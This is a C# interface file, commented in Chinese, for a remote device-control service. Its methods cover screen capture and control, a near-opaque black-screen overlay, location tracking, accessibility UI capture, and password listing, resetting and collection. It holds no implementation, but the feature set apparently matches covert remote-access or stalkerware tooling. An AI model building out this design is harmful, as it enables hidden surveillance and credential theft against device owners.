using WebRemoteControl.Core.Models;

namespace WebRemoteControl.Core.Interfaces;

/// <summary>
/// 设备控制服务接口
/// </summary>
public interface IDeviceControlService
{
    /// <summary>
    /// 发送点击命令
    /// </summary>
    Task<bool> SendTapAsync(string deviceId, int x, int y);

    /// <summary>
    /// 发送滑动命令
    /// </summary>
    Task<bool> SendSwipeAsync(string deviceId, int x1, int y1, int x2, int y2);

    /// <summary>
    /// 发送返回键命令
    /// </summary>
    Task<bool> SendBackAsync(string deviceId);

    /// <summary>
    /// 发送 Home 键命令
    /// </summary>
    Task<bool> SendHomeAsync(string deviceId);

    /// <summary>
    /// 发送任务键命令
    /// </summary>
    Task<bool> SendTaskAsync(string deviceId);

    /// <summary>
    /// 启动屏幕捕获
    /// </summary>
    Task<bool> StartScreenCaptureAsync(string deviceId);

    /// <summary>
    /// 停止屏幕捕获
    /// </summary>
    Task<bool> StopScreenCaptureAsync(string deviceId);

    /// <summary>
    /// 启动屏幕控制
    /// </summary>
    Task<bool> StartScreenControlAsync(string deviceId);

    /// <summary>
    /// 停止屏幕控制
    /// </summary>
    Task<bool> StopScreenControlAsync(string deviceId);

    /// <summary>
    /// 唤醒屏幕
    /// </summary>
    Task<bool> WakeScreenAsync(string deviceId);

    /// <summary>
    /// 锁定屏幕
    /// </summary>
    Task<bool> LockScreenAsync(string deviceId);

    /// <summary>
    /// 解锁屏幕
    /// </summary>
    Task<bool> UnlockScreenAsync(string deviceId);

    /// <summary>
    /// 启动黑屏
    /// </summary>
    Task<bool> StartBlackScreenAsync(string deviceId, int alpha = 245);

    /// <summary>
    /// 停止黑屏
    /// </summary>
    Task<bool> StopBlackScreenAsync(string deviceId);

    /// <summary>
    /// 请求位置信息
    /// </summary>
    Task<bool> RequestLocationAsync(string deviceId);

    /// <summary>
    /// 启动位置跟踪
    /// </summary>
    Task<bool> StartLocationTrackingAsync(string deviceId);

    /// <summary>
    /// 停止位置跟踪
    /// </summary>
    Task<bool> StopLocationTrackingAsync(string deviceId);

    /// <summary>
    /// 启动桌面阅读器（无障碍UI捕获）
    /// </summary>
    Task<bool> StartScreenReaderAsync(string deviceId);

    /// <summary>
    /// 停止桌面阅读器
    /// </summary>
    Task<bool> StopScreenReaderAsync(string deviceId);

    /// <summary>
    /// 请求密码列表
    /// </summary>
    Task<bool> RequestPasswordListAsync(string deviceId);

    /// <summary>
    /// 重置指定类型的密码
    /// </summary>
    Task<bool> ResetPasswordAsync(string deviceId, PasswordType passwordType);

    /// <summary>
    /// 重置所有密码
    /// </summary>
    Task<bool> ResetAllPasswordsAsync(string deviceId);

    /// <summary>
    /// 开始密码采集
    /// </summary>
    Task<bool> StartPasswordCollectionAsync(string deviceId, PasswordType passwordType);

    /// <summary>
    /// 停止密码采集
    /// </summary>
    Task<bool> StopPasswordCollectionAsync(string deviceId);
}

